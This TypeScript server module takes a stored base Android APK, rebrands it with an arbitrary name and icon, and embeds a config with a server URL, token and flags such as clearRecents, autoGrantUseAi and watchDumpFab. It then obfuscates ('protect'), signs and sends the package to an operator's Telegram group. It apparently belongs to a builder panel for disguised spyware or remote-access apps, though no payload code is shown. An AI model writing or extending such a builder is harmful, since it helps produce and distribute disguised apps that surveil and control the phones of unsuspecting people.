import { copyFileSync, mkdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { randomBytes } from 'node:crypto';

import {
  baseApkPath,
  baseApkReady,
  readBaseSettings,
} from '@/server/telegram/apkSigner/baseStore';
import { brandApk } from '@/server/telegram/apkSigner/brand';
import {
  cleanupTaskDir,
  processApk,
  resolveSignerPaths,
} from '@/server/telegram/apkSigner/pipeline';
import { realtimeBase, realtimeHeaders } from '@/server/realtime/client';

export type BuildForPortInput = {
  portCode: string;
  label: string;
  iconPng?: Buffer;
  chatId?: number;
};

export type BuildForPortResult = {
  fileName: string;
  groupId: number;
};

function sanitizeFileName(label: string): string {
  const base = label
    .trim()
    .replace(/[^\w\u0600-\u06FF\- ]+/g, '')
    .replace(/\s+/g, '_')
    .slice(0, 40);
  return `${base || 'app'}.apk`;
}

function randToken(n: number): string {
  return randomBytes(Math.ceil(n / 2))
    .toString('hex')
    .slice(0, n);
}

async function loadPort(code: string): Promise<{ code: string; groupId: number; name?: string } | null> {
  try {
    const res = await fetch(`${realtimeBase()}/v1/ports`, {
      headers: realtimeHeaders(),
      cache: 'no-store',
    });
    if (!res.ok) return null;
    const body = (await res.json()) as { items?: { code?: string; groupId?: number; name?: string }[] };
    const hit = (body.items || []).find((p) => p.code === code);
    if (!hit?.code || !hit.groupId) return null;
    return { code: hit.code, groupId: Number(hit.groupId), name: hit.name };
  } catch {
    return null;
  }
}

function buildConfigJson(
  portCode: string,
  settings: {
    serverUrl: string;
    token: string;
    frameKey: string;
    autoGrantUseAi: boolean;
    watchMarkEye: boolean;
    watchDumpFab: boolean;
    clearRecents: boolean;
  },
): string {
  return `${JSON.stringify(
    {
      port: portCode,
      serverUrl: settings.serverUrl,
      token: settings.token,
      frameKey: settings.frameKey,
      autoGrantUseAi: settings.autoGrantUseAi,
      watchMarkEye: settings.watchMarkEye,
      watchDumpFab: settings.watchDumpFab,
      clearRecents: settings.clearRecents,
    },
    null,
    2,
  )}\n`;
}

async function sendApkDocument(chatId: number, filePath: string, fileName: string): Promise<void> {
  const token = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
  if (!token) throw new Error('TELEGRAM_BOT_TOKEN missing');
  const bytes = new Uint8Array(readFileSync(filePath));
  const blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
  const form = new FormData();
  form.append('chat_id', String(chatId));
  form.append('document', blob, fileName);
  form.append('caption', fileName.replace(/\.apk$/i, ''));
  const res = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
    method: 'POST',
    body: form,
  });
  const data = (await res.json()) as { ok?: boolean; description?: string };
  if (!data.ok) {
    throw new Error(data.description || 'sendDocument failed');
  }
}

/**
 * Brand base APK for a port, protect+sign, send to the port's Telegram group.
 */
export async function buildAndSendApk(input: BuildForPortInput): Promise<BuildForPortResult> {
  if (!baseApkReady()) {
    throw new Error('APK پایه هنوز آپلود نشده');
  }
  const port = await loadPort(input.portCode);
  if (!port) {
    throw new Error('پورت یا گروه پیدا نشد');
  }
  const groupId = input.chatId && input.chatId !== 0 ? input.chatId : port.groupId;
  if (!groupId) {
    throw new Error('گروه پورت وصل نیست');
  }

  const paths = resolveSignerPaths();
  mkdirSync(paths.workRoot, { recursive: true });
  const taskDir = join(paths.workRoot, `build_${Date.now()}_${randToken(6)}`);
  mkdirSync(taskDir, { recursive: true });
  const settings = readBaseSettings();
  if (!settings.serverUrl) {
    throw new Error('serverUrl در تنظیمات APK پایه ثبت نشده');
  }
  if (!settings.versionName || settings.versionCode < 1) {
    throw new Error('نسخه برنامه در تنظیمات APK پایه ثبت نشده');
  }

  const staged = join(taskDir, 'base.apk');
  copyFileSync(baseApkPath(), staged);

  const configJson = buildConfigJson(input.portCode, settings);
  let branded: string;
  try {
    branded = await brandApk(staged, taskDir, {
      label: input.label,
      iconPng: input.iconPng,
      configJson,
      versionName: settings.versionName,
      versionCode: settings.versionCode,
    });
  } catch (err) {
    cleanupTaskDir(taskDir);
    throw err;
  }

  const outName = sanitizeFileName(input.label);
  let result: { path: string; fileName: string; taskDir: string };
  try {
    result = await processApk(branded, { outFileName: outName, reuseTaskDir: taskDir });
  } catch (err) {
    cleanupTaskDir(taskDir);
    throw err;
  }

  try {
    await sendApkDocument(groupId, result.path, result.fileName);
  } finally {
    cleanupTaskDir(result.taskDir);
  }

  return { fileName: result.fileName, groupId };
}
